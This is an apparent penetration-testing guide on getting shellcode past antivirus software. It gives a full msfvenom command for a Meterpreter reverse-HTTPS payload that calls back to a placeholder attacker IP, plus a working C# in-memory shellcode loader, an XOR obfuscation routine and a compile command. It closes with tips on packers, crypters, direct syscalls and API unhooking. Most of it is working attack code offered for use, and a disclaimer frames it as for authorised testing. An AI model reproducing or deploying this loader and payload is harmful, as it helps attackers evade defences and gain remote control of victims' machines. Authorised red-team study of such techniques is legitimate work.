
# 🛡️ AV Evasion: Shellcode Execution Walkthrough

> **Disclaimer**: This guide is for **educational and ethical penetration testing** only. Do not use against systems without **explicit authorization**.

---

## 🎯 Goal

Bypass antivirus (AV) detection using custom shellcode execution techniques (e.g., reverse shell or Meterpreter payload).

---

## 🧰 Tools Required

- `msfvenom` (Metasploit)
- Programming language: `C#`, `C`, or `C++`
- Optional tools:
  - `PEzor`, `Shellter`
  - `.NET` obfuscators: `ConfuserEx`, `Dotfuscator`
  - `Donut` (shellcode generator)
- Windows API knowledge: `VirtualAlloc`, `CreateThread`, etc.

---

## 🧪 Step-by-Step Walkthrough

### 1. Generate Shellcode

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 -f csharp -e x64/xor_dynamic -i 5
```

- `-p`: Payload
- `-f csharp`: C# format
- `-e x64/xor_dynamic`: Encoder for evasion
- `-i 5`: Encoding iterations

---

### 2. Write a C# Shellcode Loader

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("msvcrt.dll")]
    static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);

    static void Main(string[] args)
    {
        byte[] shellcode = new byte[] { /* msfvenom shellcode */ };

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
        memcpy(addr, shellcode, (uint)shellcode.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        System.Threading.Thread.Sleep(-1);
    }
}
```

---

### 3. Obfuscate Shellcode

- Use **XOR encoding**, e.g.:

```csharp
for (int i = 0; i < shellcode.Length; i++)
    shellcode[i] ^= 0xAA; // XOR key
```

- Base64-encode and decode at runtime to avoid static signature detection.

---

### 4. Compile Executable

```bash
csc.exe /platform:x64 /unsafe /out:loader.exe loader.cs
```

---

### 5. Obfuscate the Binary

- Use obfuscators:
  - `ConfuserEx`, `Dotfuscator`, `SmartAssembly`
- Use crypters/packers:
  - `PEzor`, `Shellter`

---

### 6. Test Against Antivirus

Recommended sandboxes:
- [Hybrid Analysis](https://www.hybrid-analysis.com/)
- [Any.Run](https://any.run/)
- Avoid VirusTotal with sensitive payloads.

---

## 💡 Advanced AV Evasion Techniques

| Technique               | Effectiveness |
|------------------------|---------------|
| XOR encoding           | Medium        |
| Custom shellcode stage | High          |
| API unhooking          | Very High     |
| Direct syscalls        | Very High     |
| C/C++ native loaders   | Very High     |

---

## ✅ Tips

- Avoid known API names and static signatures.
- Use `VirtualAlloc`, `NtCreateThreadEx`, `QueueUserAPC`, etc.
- Use syscalls instead of WinAPI to evade user-mode hooks.
- Encrypt or split the shellcode to avoid detection.

---

## ⚠️ Legal Notice

Use only in:
- Personal labs
- CTFs
- Environments with **explicit written consent**

**Unauthorized use is illegal.**

---
